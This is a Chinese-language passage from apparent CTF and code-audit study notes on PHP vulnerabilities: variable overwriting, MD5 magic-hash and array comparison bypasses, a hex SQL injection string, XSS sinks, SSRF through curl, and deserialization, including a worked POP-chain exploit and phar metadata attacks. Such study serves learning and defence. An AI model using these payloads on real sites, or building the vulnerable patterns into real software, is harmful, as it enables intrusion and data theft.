  - EXTR_PREFIX_IF_EXISTS - 仅在当前符号表中已有同名变量时，建立附加了前缀的变量名，其它的都不处理。
  - EXTR_REFS - 将变量作为引用提取。导入的变量仍然引用了数组参数的值。

- prefix：可选。如果 extract_rules 参数的值是 EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、 EXTR_PREFIX_INVALID 或 EXTR_PREFIX_IF_EXISTS，则 prefix 是必需的。

代码示例：

```php
<?php
    $color = "blue";
    $one_array = array("color" => "red",
        "size"  => "medium",
        "name" => "dog");
    extract($one_array);
    echo "$color, $size, $name";
?>
    
执行结果——>
red, medium, dog
```

在上述代码中，我们看到，本来我们定义的color是blue，输出的时候变成了red，本来我们没有定义size和name，可是却能输出这两个变量。

还有一些在CTF比赛中出现过的用法，比如直接让你POST传参来改变某个变量的值。

代码示例：

```php
<?php
    $name = 'cat';
    extract($_POST);
    echo $name;
?>
```

参时如果我们POST传入name=dog，那么页面将会回显dog，说明这个函数的使用让我们实现了变量的覆盖，改变了变量的值。

### parse_str()

此函数把查询到的字符串解析到变量中。

```php
parse_str(string,array)
```

#### 参数

- string：必需。规定要解析的字符串。
- array：可选。规定存储变量的数组名称。该参数只是变量存储到数组中。

代码示例:

```php
<?php
    parse_str("name=Ameng&sex=boy",$a);
    print_r($a);
?>
    
执行结果——>
Array
(
    [name] => Ameng
    [sex] => boy
)
```

上述代码是有array情况下的使用情况，那么如何实现变量的覆盖呢？如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。

代码示例：

```php
<?php
	$name = 'who';
    $age = '20';
    parse_str("name=Ameng&age=21");
    echo "$name, $age";
?>
执行结果——>
Ameng, 21
```

通过上述代码，我们可以发现，变量name和age都发生了变化，被新的值覆盖了。这里我用的是 PHP 7.4.3 版本。发现这个函数的这个作用还是存在的，且没有任何危险提示。

### import_request_variables()

此函数将GET/POST/Cookie变量导入到全局作用域中。从而能够达到变量覆盖的作用。

版本要求：PHP 4 >= 4.1.0, PHP 5 < 5.4.0

```php
bool import_request_variables ( string $types [, string $prefix ] )
```

#### 参数

- types：指定需要导入的变量，可以用字母 G、P 和 C 分别表示 GET、POST 和 Cookie，这些字母不区分大小写，所以你可以使用 g 、 p 和 c 的任何组合。POST 包含了通过 POST 方法上传的文件信息。注意这些字母的顺序，当使用 gp 时，POST 变量将使用相同的名字覆盖 GET 变量。
- prefix：变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为 userid 的 GET 变量，同时提供了 pref_ 作为前缀，那么你将获得一个名为 $pref_userid 的全局变量。虽然 prefix 参数是可选的，但如果不指定前缀，或者指定一个空字符串作为前缀，你将获得一个 E_NOTICE 级别的错误。

代码示例：

```php
<?php
    $name = 'who';
	import_request_variables('gp');
	if($name == 'Ameng'){
		echo $name;
	}
	else{
		echo 'You are not Ameng';
	}
?>
```

如果什么变量也不传，那么页面将回显`You are not Ameng`如果通过GET或者POST传入`name=Ameng`那么页面就会回显`Ameng`

可以见到此函数还是很危险的，没有修复方法，不使用就是最好的方法。所以在新版本的 PHP 中已经废弃了这个函数。

### foreach()

`foreach` 语法结构提供了遍历数组的简单方式。`foreach`   仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：   

```php
foreach (array_expression as $value)
    statement
foreach (array_expression as $key => $value)
    statement
```

第一种格式遍历给定的 array_expression 数组。每次循环中，当前单元的值被赋给 $value 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。  

  第二种格式做同样的事，只是除了当前单元的键名也会在每次循环中被赋给变量 $key。

那么这个函数如何实现变量的覆盖呢？我们来看个案例.

代码示例：

```php
<?php
    $name = 'who';
    foreach($_GET as $key => $value)	{  
            $$key = $value;  
    }  
    if($name == "Ameng"){
        echo 'You are right!';
    }
	else{
        echo 'You are flase!';
    }
?>
```

那么执行结果是怎样的呢？当我们直接打开页面的时候它会输出`You are false!`,而当我们通过GET传参`name=Ameng`的时候，它会回显`You are right!`。那么这是为什么呢？我们来分析一下

关键点就在于`$$`这种写法。这种写法称为可变变量。一个变量能够获取一个普通变量的值作为这个可变变量的变量名。当使用`foreach`来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的键值作为变量的值。这样就产生了变量覆盖漏洞，如上代码示例。其执行过程为`$$key`=`$name`，最后赋值为`$value`，从而实现了变量覆盖。

## 弱类型比较

### md5()函数和sha1()绕过

关于这两个函数想必我们不陌生，无论是在实际代码审计中，还是在CTF比赛中，这些我们都是碰到过的函数。那么当我们遇到用这两个函数来判断的时候，如果绕过呢？

PHP 在处理哈希字符串的时候，会使用`!=`或者`==`来对哈希值进行比较，它会把每一个`0E`开头的哈希值都解释为0，那么这个时候问题就来了，如果两个不同的值，经过哈希以后它们都变成了`0E`开头的哈希值，那么 PHP 就会将它们视作相等处理。那么`0E`开头的哈希值有哪些呢？

```
s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s1885207154a
0e509367213418206700842008763514
s1502113478a
0e861580163291561247404381396064
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s155964671a
0e342768416822451524974117254469
s1184209335a
0e072485820392773389523109082030
s1665632922a
0e731198061491163073197128363787
s1502113478a
0e861580163291561247404381396064
s1836677006a
0e481036490867661113260034900752
s1091221200a
0e940624217856561557816327384675
s155964671a
0e342768416822451524974117254469
s1502113478a
0e861580163291561247404381396064
s155964671a
0e342768416822451524974117254469
s1665632922a
0e731198061491163073197128363787
s155964671a
0e342768416822451524974117254469
s1091221200a
0e940624217856561557816327384675
s1836677006a
0e481036490867661113260034900752
s1885207154a
0e509367213418206700842008763514
s532378020a
0e220463095855511507588041205815
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675
s214587387a
0e848240448830537924465865611904
s1502113478a
0e861580163291561247404381396064
s1091221200a
0e940624217856561557816327384675
s1665632922a
0e731198061491163073197128363787
s1885207154a
0e509367213418206700842008763514
s1836677006a
0e481036490867661113260034900752
s1665632922a
0e731198061491163073197128363787
s878926199a
0e545993274517709034328855841020
```

来个简单的例子吧

代码示例：

```php
<?php
    $a = $_GET['a'];
	$b = $_GET['b'];
	if($a != $b && md5($a) == md5($b)){
        echo '这就是弱类型绕过';
    }
	else{
        echo '再思考一下';
    }
?>
```

从上面我给出的哪些值中，挑两个不同的值传入参数，就能看到相应的结果

上面是`md5()`函数的绕过姿势，那么`sha1()`如何绕过呢？再来看一个简单的例子

```php
<?php
    $a = $_GET['a'];
	$b = $_GET['b'];
	if(isset($a,$b)){
		if(sha1($a) === sha1($b)){
			echo 'nice!!!';
		}
		else{
			echo 'Try again!';
		}
	}
?>
```

当我们传入`a[]=1&b[]=2`的时候，虽然它会给出警告，说我们应该传入字符串而不应该是数组，但是它还是输出了`nice!!!`，所以我们完全可以用数字来绕过`sha1()`函数的比较。

### is_numeric()绕过

我们先来了解一下这个函数。此函数是检测变量是否为数字或者数字字符串

```php
is_numeric( mixed $var) : bool
```

如果`var`是数字或者数字字符串那么就返回TRUE，否则就返回FALSE。那么这里说的绕过是什么姿势呢？是十六进制。我们先来看一个简单的例子。

代码示例：

```php
<?php
    $a = is_numeric('0x31206f722031');
	if($a){
        echo 'It meets my requirement';
    }
	else{
        echo 'Try again';
    }
?>
执行结果——>
It meets my requirement
```

这里说一下`0x31206f722031`这个是什么？这个是`or 1=1`的十六进制，从这里可以看出，如果某处使用了此函数，并将修饰后的变量带入数据库查询语句中，那么我们就能利用此漏洞实现sql注入。同样的，这个漏洞再CTF比赛中也是很常见的。

### in_array()绕过

此函数用来检测数组中是否存在某个值。

```php
in_array( mixed $needle, array $haystack[, bool $strict = FALSE] ) : bool
```

#### 参数

- needle：带搜索的值(区分大小写)。
- haystack：带搜索的数组。
- strict：若此参数的值为TRUE，那么`in_array()`函数将会检查needle的类型是否和haystack中的类型相同。

有时候我们再传入一个数组的时候，代码可能会过滤某些敏感字符串，但是我们又需要传入这样的字符串，那么我们应该如何绕过它的检测呢？

```php
<?php
    $myarr = array('Ameng');
	$needle = 0;
	if(in_array($needle,$myarr)){
        echo "It's in array";
    }
	else{
        echo "not in array";
    }
?>
```

上面代码示例执行的结果会是什么呢？从简单的逻辑上分析。0是不存在要搜索的数组中的，所以理论上，应该是输出`not in array`，但是实际却输出了`It's in array`。这是为什么呢？原因就在于PHP的默认类型转换。这里我们第三个参数并没有设置为`true`那么默认就是非严格比较，所以在数字与字符串进行比较时，字符串先被强制转换成数字，然后再进行比较。并且因为某些类型转换正在发生，就会导致发生数据丢失，并且都被视为相同。所以归根到底还是非严格比较导致的问题。所以再遇到这个函数用来变量检测的时候，我们可以看看第三个参数是否开启，若未开启，则存在数组绕过。

## XSS

在这里首先你要对XSS的基本原理要知道。PHP中一下这些函数之所以会出现XSS的漏洞情况，主要还是没有对输出的变量进行过滤。

### print()

代码示例：

```php
<?php
	$str = $_GET['x'];
	print($str);
?>
```

![](/images/20200828220802.png)

### print_r()

代码示例：

```php
<?php
	$str = $_GET['x'];
	print_r($str);
?>
```

![](/images/20200828220802.png)

### echo()

代码示例：

```php
<?php
	$str = $_GET['x'];
	echo "$str";
?>
```

我们传入相应参数，执行结果如下：

![](/images/20200828220802.png)

### printf()

代码示例：

```php
<?php
	$str = $_GET['x'];
	printf($str);
?>
```

执行结果和上面相同，我就不再贴图片了。

### sprintf()

代码示例：

```php
<?php
	$str = $_GET['x'];
	$a = sprintf($str);
	echo "$a";
?>
```

### die()

此函数输出一条信息，并退出当前脚本。

代码示例：

```php
<?php
	$str = $_GET['x'];
	die($str);
?>
```

### var_dump()

此函数打印变量的相关信息，用来显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开之，通过缩进显示其结构。

代码示例：

```php
<?php
	$str = $_GET['x'];
	$a = array($str);
	var_dump($a);
?>
```

### var_export()

此函数输出或者返回一个变量的字符串表示。它返回关于传递给该函数的变量的结构信息，和`var_dump`类似，不同的是其返回的表示是合法的 PHP 代码。

代码示例：

```php
<?php
	$str = $_GET['x'];
	$a = array($str);
	var_export($a);
?>
```

![](/images/20200828223749.png)

## PHP黑魔法

这里大部分函数的使用已经在上面详细介绍过了，这里我就针对每一种函数大概介绍一下其主要存在的利用方法。

### md5()

`md5()`函数绕过sql注入。我们来看一个例子。

代码示例：

```php
$password=$_POST['password'];
$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
$result=mysqli_query($link,$sql);
if(mysqli_num_rows($result)>0){
    echo 'flag is :'.$flag;
}
else{
    echo '密码错误!';
}
```

这里提交的参数通过`md5`函数处理，然后再进入SQL查询语句，所以常规的注入手段就不行了，那么如果md5后的转换成字符串格式变成了`'or'xxxx`的格式，不就可以注入了么。`md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c`

转成字符串为`'or'6xxx`

### eval()

在执行命令时，可使用分号构造处多条语句。类似这种。

```php
<?php
	$cmd = "echo 'a';echo '--------------';echo 'b';";
	echo eval($cmd);
?>
```



### ereg()

存在`%00`截断，当遇到使用此函数来进行正则匹配时，我们可以用`%00`来截断正则匹配，从而绕过正则。

### strcmp()

这个在前面介绍过，就是数组绕过技巧。

### curl_setopt()

存在ssrf漏洞。

代码示例：

```php
<?php
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $_GET['Ameng']);
    #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
    curl_exec($ch);
    curl_close($ch);
?>
```

使用file协议进行任意文件读取

![](/images/20200830112047.png)

除此之外还有dict协议查看端口信息。gopher协议反弹shell利用等。

### preg_replace()

此函数前面详细介绍过，/e模式下的命令执行。

### urldecode()

url二次编码绕过。

代码示例：

```php
<?php
	$name = urldecode($_GET['name']);
	if($name = "Ameng"){
		echo "Plase~";
	}
	else{
		echo "sorry";
	}
?>
```

将Ameng进行二次url编码，然后传入即可得到满足条件。

### file_get_contents()

常用伪协议来进行绕过。

### parse_url()

此函数主要用于绕过某些过滤，先简单了解一下函数的基本用法。

代码示例：

```php
<?php
	$url = "http://www.jlx-love.com/about";
	$parts = parse_url($url);
	print_r($parts);
?>
    
执行结果——>
Array 
    ( 
    [scheme] => http 
    [host] => www.jlx-love.com 		[path] => /about 
	)
```

可以看到这个函数把我们的变量值拆分成一个几个部分。那么绕过过滤又是说的哪回事呢？其实就是当我们在浏览器输入url时，那么就会将url中的\转换为/，从而就会导致`parse_url`的白名单绕过。

## 反序列化漏洞

### 简介

在了解一些函数之前，我们首先需要了解什么是序列化和反序列化。

序列化：把对象转换为字节序列的过程成为对象的序列化。

反序列化：把字节序列恢复为对象的过程称为对象的反序列化。

归根到底，就是将数据转化成一种可逆的数据结构，逆向的过程就是反序列化。

在 PHP 中主要就是通过`serialize`和`unserialize`来实现数据的序列化和反序列化。

那么漏洞是如何形成的呢？

PHP 的反序列化漏洞主要是因为未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化的过程，从而就可以导致各种危险行为。

那么我们先来看一看序列化后的数据格式是怎样的，了解了序列化后的数据，我们才能更好的理解和利用漏洞。所以我们来构造一段序列化的值。

代码示例：

```php
<?php
    class Ameng{
    public $who = "Ameng";
	}
	$a = serialize(new Ameng);
	echo $a;
?>
执行结果——>
O:5:"Ameng":1:{s:3:"who";s:5:"Ameng";}
```

![](/images/20200830141143.png)

这里还要补充一点，就是关于变量的分类，变量的类别有三种：

- public：正常操作，在反序列化时原型就行。
- protected：反序列化时在变量名前加上%00*%00。
- private：反序列化时在变量名前加上%00类名%00。

序列化我们知道了是个什么格式，那么如何利用反序列化来触发漏洞进行利用呢？

### __wakeup()

在我们反序列化时，会先检查类中是否存在`__wakeup()`如果存在，则执行。但是如果对象属性个数的值大于真实的属性个数时就会跳过`__wakeup()`执行`__destruct()`。

影响版本：

PHP5 < 5.6.25

PHP7 < 7.0.10

代码示例：

```php
<?php
	header("Content-Type: text/html; charset=utf-8");
    class Ameng{ 
        public $name='1.php'; 

        function __destruct(){ 
            echo "destruct执行<br>";

            echo highlight_file($this->name, true); 
        } 
         

        function __wakeup(){ 
            echo "wakeup执行<br>";
            $this->name='1.php'; 
        } 
    }
	$data = 'O:5:"Ameng":2:{s:4:"name";s:5:"2.php";}';
	unserialize($data);
?>
```

执行结果：

![](/images/20200830153532.png)

### __sleep()

`__sleep()`函数刚好与`__waeup()`相反，前者是在序列化一个对象时被调用，后者是在反序列化时被调用。那么该如何利用呢？我们看看代码。

```php
<?php
	header("Content-Type: text/html; charset=utf-8");
    class Ameng{ 
        public $name='1.php'; 
		
		public function __construct($name){
        $this->name=$name;
    }
		
		function __sleep(){
			echo "sleep()执行<br>";
			echo highlight_file($this->name, true);
		}
		
		function __destruct(){
			echo "over<br>";
		}
		
        function __wakeup(){ 
            echo "wakeup执行<br>";         
        } 
    }
	$a = new Ameng("2.php");
	$b = serialize($a);
?>
```

执行结果：

![](/images/20200830161758.png)

### __destruct()

这个函数的作用其实在上面的例子中已经显示了，就是在对象被销毁时调用，倘若这个函数中有命令执行之类的功能，我们完全可以利用这一点来进行漏洞的利用，得到自己想要的结果。

### __construct()

这个函数的作用在`__sleep()`也是体现了的，这个函数就是在一个对象被创建时会调用这个函数，比如我在`__sleep()`中用这个函数来对变量进行赋值。

### __call()

此函数用来监视一个对象中的其他方法。当你尝试调用一个对象中不存在的或者被权限控制的方法，那么`__call`就会被自动调用

代码示例：

```php
<?php
	header("Content-Type: text/html; charset=utf-8");
    class Ameng{  
		
		public function __call($name,$args){
			echo "<br>"."call执行失败";
		}
		
		public static function __callStatic($name,$args){
			echo "<br>"."callStatic执行失败";
		}
    }
	$a = new Ameng;
	$a->b();
	Ameng::b();
?>
```

执行结果：

![](/images/20200830164518.png)

### __callStatic()

这个方法是 PHP5.3 增加的新方法。主要是调用不可见的静态方法时会自动调用。具体使用在上面代码示例和结果可见。那么这两个函数有什么值得我们关注的呢？想一想，倘若这两个函数中有命令执行的函数，那么我们调用对象中不存在方法时就可以调用这两个函数，这不就达到我们想要的目的了。                                                                                     

### __get()

一般来说，我们总是把类的属性定义为private。但有时候我们对属性的读取和赋值是非常频繁，这个时候PHP就提供了两个函数来获取和赋值类中的属性。

get方法用来获取私有成员属性的值。

代码示例：

```php
//__get()方法用来获取私有属性
public function __get($name){
return $this->$name;
}
```

#### 参数

- $name：要获取成员属性的名称。

### __set()

此方法用来给私有成员属性赋值。

代码示例：

```php
//__set()方法用来设置私有属性
public function __set($name,$value){
$this->$name = $value;
}
```

#### 参数

- $name：要赋值的属性名。
- $value：给属性赋值的值。

### __isset()

这个函数是当我们对不可访问属性调用`isset()`或者`empty()`时调用。

在这之前我们要先了解一下`isset()`函数的使用。`isset()`函数检测某个变量是否被设置了。所以这个时候问题就来了，如果我们使用这个函数去检测对象里面的成员是否设定，那么会发生什么呢？

若对象的成员是公有成员，那没什么问题。倘若对象的成员是私有成员，那这个函数就不行了，人家根本就不允许你访问，你咋能检测人家是否设定了呢？那我们该怎么办？这个时候我们可以在类里面加上`__isset()`方法，接下来就可以使用`isset()`在对象外面访问对象里面的私有成员了。

代码示例：

```php
<?php
	header("Content-Type: text/html; charset=utf-8");
    class Ameng{  
		private $name;
		
		public function __construct($name=""){
			$this->name = $name;
		}
		
		public function __isset($content){
			echo "当在类外面调用isset方法时，那么我就会执行！"."<br>";
			echo isset($this->$content);
		}
    }
	$ameng = new Ameng("Ameng");
	echo isset($ameng->name);
?>
```

执行结果：

![](/images/20200830173037.png)

### __unset()

这个方法基本和`__insset`情况一致，都是在类外访问类内私有成员时要调用这个函数，基本调用的方法和上面一致。

代码示例：

```php
<?php
	header("Content-Type: text/html; charset=utf-8");
    class Ameng{  
		private $name;
		
		public function __construct($name=""){
			$this->name = $name;
		}
		
		public function __unset($content){
			echo "当在类外面调用unset方法时，那么我就会执行！"."<br>";
			echo isset($this->$content);
		}
    }
	$ameng = new Ameng("Ameng");
	unset($ameng->name);
?>
```

执行结果：

![](/images/20200830174239.png)

### toString()

此函数是将一个对象当作一个字符串来使用时，就会自动调用该方法，且在该方法中，可以返回一定的字符串，来表示该对象转换为字符串之后的结果。

通常情况下，我们访问类的属性的时候都是`$实例化名称->属性名`这样的格式去访问，但是我们不能直接echo去输出对象，可是当我们使用`__tostring()`就可以直接用echo来输出了。

代码示例：

```php
<?php
    header("Content-Type: text/html; charset=utf-8");
	class Ameng{
        public $name;
        private $age;
        function __construct($name,$age){
            $this->name = $name;
            $this->age = $age;
        }
        public function __toString(){
            return $this->name . $this->age . '岁了';
        }
    }
	$ameng = new Ameng('Ameng',3);
	echo $ameng;
?>
```

执行结果：

```
Ameng3岁了
```

### __invoke()

当尝试以调用函数的方式调用一个对象时，`__invoke()`方法会被自动调用。

版本要求：

PHP > 5.3.0

代码示例：

```php
<?php
    header("Content-Type: text/html; charset=utf-8");
	class Ameng{
        public $name;
        private $age;
        function __construct($name,$age){
            $this->name = $name;
            $this->age = $age;
        }
        public function __invoke(){
           echo '你用调用函数的方式调用了这个对象，所以我起作用了';
        }
    }
	$ameng = new Ameng('Ameng',3);
	$ameng();
?>
执行结果——>
你用调用函数的方式调用了这个对象，所以我起作用
```

### pop链的构造

### 思路

1. 寻找位点（unserialize函数—>变量可控）
2. 正向构造（各种方法）
3. 反向推理（从要完成的目的出发，反向推理，最后找到最先被调用的位置处）

来看一个简单的例子(HECTF)：

```php
<?php
class Read {
    public $var;
    public $token;
    public $token_flag;
    public function __construct() { 
         $this->token_flag = $this->token = md5(rand(1,10000));
         $this->token =&$this->token_flag;
    }
    public function __invoke(){
        $this->token_flag = md5(rand(1,10000));
        
        if($this->token === $this->token_flag)
        {
            echo "flag{**********}";
        }
    }
}
class Show
{
    public $source;
    public $str;
    public function __construct()
    {
        echo $this->source."<br>";
    }

    public function __toString()
    {
        $this->str['str']->source;
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $params;
    public function __construct()
    {
        $this->params = array();
    }

    public function __get($key)
    {
        $func = $this->params;
        return $func();
    }
}
if(isset($_GET['chal']))
{
    $chal = unserialize($_GET['chal']);
}
```

我们要拿到flag，在`__invoke()`函数，当对象被当作函数调用时，那么就会自动执行该函数。所以我们要做的就是用函数来调用对象。

那么我们首先找到起点，就是unserialize函数的变量，因为这个变量是我们可控的，但是肯定是过滤了一些常见的协议，那些协议我在上面也简单介绍过用法。

通过函数的过程搜索，我们能够看到preg_match第二个参数会被当作字符串处理，在类Test中，我们可以给$func赋值给Read对象。

那么我们可以构造如下pop链

```php
<?php 
    ··········
    $read = new Read();
    $show = new Show();
    $test = new Test();
	
	$read->token = &$read->token_flag;
    $test->params = $read;
    $show->str['str'] = $test;
    $show->source = $show;
    echo serialize($show);
?>
```

给个图总结一下：

![](/images/20200830193825.png)

### phar与反序列化

#### 简介

PHAR（"PHP archive"）是PHP里类似JAR的一种打包文件，在PHP > 5.3版本中默认开启。其实就是用来打包程序的。

#### 文件结构

1. a stub：`xxx<?php xxx;__HALT_COMPILER();?>`前面内容不限，后面必须以`__HALT_COMPILER();?>`结尾，否则phar扩展无法将该文件识别为phar文件。

2. 官方手册

   phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。

![](/images/20200831092854.png)

#### 实验

前提：将`php.ini`中的`phar.readonly`选项设置为`off`，不然无法生成phar文件。

##### phar.php：

```php
<?php
    class TestObject {
    }
    $phar = new Phar("phar.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $o = new TestObject();
    $o -> data='Hello I am Ameng';
    $phar->setMetadata($o); //将自定义的meta-data存入manifest
    $phar->addFromString("test.txt", "test"); //添加要压缩的文件
    //签名自动计算
    $phar->stopBuffering();
?>
```

在我们访问之后，会在当前目录下生成一个phar.phar文件，如下图所示。

![](/images/20200830211454.png)

然后查看文件的十六进制形式，我们就可以看到meta-data是以序列化的形式存储。既然存在序列化的数据，那肯定有序列化的逆向操作反序列化。那么这里在PHP中存在很多通过`phar://`伪协议解析phar文件时，会将meta-data进行反序列化。可用函数如下图

![](/images/20200831094439.png)

##### Ameng.php

```php
<?php
class TestObject{
    function __destruct()
    {
        echo $this -> data;   // TODO: Implement __destruct() method.
    }
}
include('phar://phar.phar');
?>
```

执行结果：

![](/images/20200830213118.png)

这里简单介绍一下phar的大致应用，更详细可以参考[seebug](https://paper.seebug.org/680/)。

## 其他一些总结

### basename()

此函数返回路径中的文件名的一部分(后面)

```php
basename(path,suffix)
```

#### 参数

- path：必需。规定要检查的路径。
- suffix：可选。规定文件的扩展名。

代码示例：

```php
<?php
    $path = "index.php/test.php";
	echo basename($path);
?>
        
执行结果——>
test.php
```

此函数还有一个特点，就是会去掉文件名的非ASCII码值。

代码示例：

```php
<?php
	$path = $_GET['x'];
	print_r(basename($path));
?>
```

我们通过 url 传入参数`x=index.php/config.php/%ff`

结果如下：

![](/images/20200826211734.png)

我们看到，`%ff`直接没了，而是直接输出前面的的文件名，这个可以用来绕过一些正则匹配。原因就在于`%ff`在通过 url 传参时会被 url 解码，解码成了不可见字符，满足了`basename`函数对文件名的非ASCII值去除的特点，从而被删掉。